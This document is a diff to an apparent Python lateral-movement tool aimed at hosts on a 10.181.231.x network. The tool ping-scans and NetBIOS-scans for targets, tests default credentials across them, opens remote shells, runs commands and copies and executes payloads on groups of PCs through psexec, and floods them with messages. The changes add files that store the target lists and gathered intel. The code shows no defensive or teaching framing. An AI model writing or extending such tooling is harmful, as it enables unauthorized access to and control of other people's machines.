@@ -23,10 +23,8 @@ validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "r
 validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list", "View intel on a given IP"]
 validUsage = ["-", "-", "-","credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip]"]
 
-ips = [112,125,130,131,133,134,137,138,139,140,142,143,144,145,146,147,148,151,152,154,155,159,160,165,166,167,169,171,172,174,175,176,177,179,180,181,222,224,229,230,231]
 ipNames = []
 customLists = []
-defaultCredIps = []
 exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]
 
 completeFlags = []
@@ -46,6 +44,84 @@ iv = b'C\xab\x8ef!C_\x13\xf5\xa2Z\xa0\xdaM\x19('
 #SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS
 #=============================================================================
 #=============================================================================
+
+
+def readData(filename, intswitch=False):
+    f = open(filename, "r")
+    lines = f.readlines()
+    f.close()
+    totalRet = []
+    for line in lines:
+        data = line.split("|")
+        header = data[0]
+        ret = []
+        for x in range(1, len(data)):
+            if intswitch:
+                ret.append(int(data[x].replace('\n', "")))
+            else:
+                ret.append(data[x].replace('\n', ""))
+        totalRet.append([header, ret])
+    return totalRet
+
+def writeData(filename, data):
+    os.remove(filename)
+    f = open(filename, "a")
+    for item in data:
+        writeString = ""
+        writeString += item[0]
+        for i in item[1]:
+            writeString += "|" + str(i)
+        writeString += "\n"
+        f.write(writeString)
+    f.close()
+
+def checkFile(filename):
+    try:
+        f = open(filename, "r")
+        f.readlines()
+        f.close()
+        return 1
+    except:
+        f = open(filename,"w")
+        f.write("")
+        f.close()
+        return 0
+
+def intelInit():
+    global customLists
+    global ipNames
+    global intel
+
+    intelPresent = checkFile("intel.txt")
+    hostsPresent = checkFile("hosts.txt")
+    if hostsPresent == False:
+        ipNames.append("ips")
+        customLists.append([])
+
+    ipInfo = readData("hosts.txt", True)
+    for item in ipInfo:
+        ipNames.append(item[0])
+        customLists.append(item[1])
+
+    intelInfo = readData("intel.txt")
+    for item in intelInfo:
+        intel[item[0]] = item[1]
+
+def intelWrite():
+    global customLists
+    global ipNames
+    global intel
+
+    ipInfo = []
+    for x in range(0, len(ipNames)):
+        ipInfo.append([ipNames[x], customLists[x]])
+    writeData("hosts.txt", ipInfo)
+
+    intelInfo = []
+    for key in intel:
+        intelInfo.append([key, intel[key]])
+    writeData("intel.txt", intelInfo)
+
 
 def AES_pad(data):
     if len(data) % 16 == 0:
@@ -231,9 +307,12 @@ def menu():
             rscannames()
 
         if cmd[0] == "hosts":
-            print("\n[+] TARGETS " + str(ips).replace(" ", ""))
-            for i in range(0, len(ipNames)):
-                print("[+] %s %s" % (ipNames[i], str(customLists[i])))
+            if len(customLists) > 0:
+                print("\n[+] TARGETS " + str(customLists[0]).replace(" ", ""))
+                for i in range(1, len(ipNames)):
+                    print("[+] %s %s" % (ipNames[i], str(customLists[i])))
+            else:
+                print("\n[!] No hosts found, run scan to detect")
 
         if cmd[0] == "credtest":
             try:
@@ -247,6 +326,7 @@ def menu():
                     targlist = customLists[ipNames.index(cmd[1])]
                     if cmd[2] in targList:
                         targList.remove(cmd[2])
+                intelWrite()
 
         if cmd[0] == "add":
             if len(cmd) == 3:
@@ -257,6 +337,7 @@ def menu():
                 else:
                     customLists.append([int(cmd[1])])
                     ipNames.append(cmd[2])
+                intelWrite()
 
 
         if cmd[0] == "intel":
@@ -306,7 +387,7 @@ def credTest(creds="Profile:password", iplist="default"):
 
     completeFlags = []
     index = 0
-    for i in ips:
+    for i in customLists[0]:
         completeFlags.append(0)
         x = threading.Thread(target=rexecT, args=(i,username, password, "hostname", index, True, listIndex))
         x.start()
@@ -317,6 +398,7 @@ def credTest(creds="Profile:password", iplist="default"):
     os.system("cls")
     print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
     print("[+] " + str(customLists[listIndex]).replace(" ", ""))
+    intelWrite()
 
 def rexec(targets, cmd, creds):
     global completeFlags
@@ -373,7 +455,6 @@ def rcpy(targetList, payload, creds):
 
 def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): # The actual function for executing a command so that it can be threaded
     global completeFlags
-    global defaultCredIps
     ending = tgt
     tgt = "10.181.231." + str(tgt)
     psexecString = ""
@@ -386,30 +467,31 @@ def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): # The 
 
 
 def rscan():  # Conducts a ping scan to discover any hosts on the network
-    global ips
-    ips = []
+    global customLists
+    customLists[0] = []
     for i in range(100, 240):
         ip = "10.181.231." + str(i)
         if os.system("ping -n 1 -w 100 " + ip) == 0:
-            ips.append(i)
+            customLists[0].append(i)
     os.system("cls")
     print("\n==================================================")
     print("\n[+] HOST SCAN COMPLETE")
-    print("\n[+] DISCOVERED: " + str(len(ips)))
-    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
+    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
+    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
     print("\n==================================================\n")
+    intelWrite()
 
 
 def rscannames():  # Conducts a scan of the netbios names to discover any hosts on the network
-    global ips
-    ips = []
+    global customLists
+    customLists[0] = []
     for name in range(63):
-        ips.append(os.system(r"C:\Users\Admin\nbtscan " + "\"" + str(name) + "\""))
+        customLists[0].append(os.system(r"C:\Users\Admin\nbtscan " + "\"" + str(name) + "\""))
     os.system("cls")
     print("\n==================================================")
     print("\n[+] NAME SCAN COMPLETE")
-    print("\n[+] DISCOVERED: " + str(len(ips)))
-    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
+    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
+    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
     print("\n==================================================\n")
 
 
@@ -429,4 +511,5 @@ def rmsgT(reason="", target=""):
 
 x = threading.Thread(target=serverT)
 x.start()
+intelInit()
 menu()
